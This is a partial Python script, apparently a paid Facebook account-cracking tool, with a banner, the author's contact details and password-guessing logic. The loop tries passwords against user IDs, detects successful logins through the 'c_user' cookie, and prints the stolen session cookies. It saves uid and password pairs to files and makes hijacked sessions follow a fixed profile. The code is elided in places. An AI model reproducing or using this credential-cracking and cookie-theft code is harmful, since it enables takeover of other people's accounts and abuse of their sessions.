...
def follow(self, session, coki):
        r = BeautifulSoup(session.get('https://mbasic.facebook.com/profile.php?id=100091954842186', {
...
ha = current.day
today = date.today()
#os.system('xdg-open https://www.facebook.com/Normal.User.Alamgir hokar potti team /')
os.system('espeak -a 300 " Welcome,   to,  RiponEx,  King,  Tools"')
logo =("""
\033[0;92m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗
║\ $$$$$$\                  $$\ $$\               
$$  __$$\                 $$ |\__|              
...
╚━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╝
\033[0;94m╔━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━╗\033[1;33m 
╠══[Author                   • \33[1;38mRipon Video ]\33[1;38m     ║\033[1;31m 
╠══[Facebook                 • https://www.facebook.com/Normal.User.Alamgir ]   ║  \033[1;97m  
╠══[Github                   • \33[1;38mFuck Ripon Ex ]   ║\33[1;34m   
╠══[Whatsapp                 • 01866364414 ]  ║\33[1;35m 
╠══[TOOLS                    • Paid  ]        ║ \33[1;32m   
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('\r\r\033[1;32m[Sadim-OK💚] \033[1;32m'+uid+'\033[1;32m • \033[1;32m' +ps+    '  \n[‎‎🌺]\033[0;93m COOKIE = \033[1;32m'+coki+  '  ''  \033[0;97m')
                os.system('espeak -a 300 " Sadim,  Ok,  id"')
                cek_apk(session,coki)
                open('/sdcard/Sadim-OK.txt', 'a').write( uid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
               # print('\r\r\33[1;30m[Sadim-CP] ' +uid+ ' • ' +ps+           '  \33[0;97m')
                #os.system("play op.mp3")
                os.system('espeak -a 300 " C,  p"')
                open('/sdcard/Sadim-CP😁😁.txt', 'a').write( uid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(f'\r\r%s{x}[{xr}Sadim-XD{x}]>~[%s]>~<[%s]-[OK:{xr}%s{x}]'%(H,loop,tl,len(oks))),
        sys.stdout.flush()
    except:
        pass
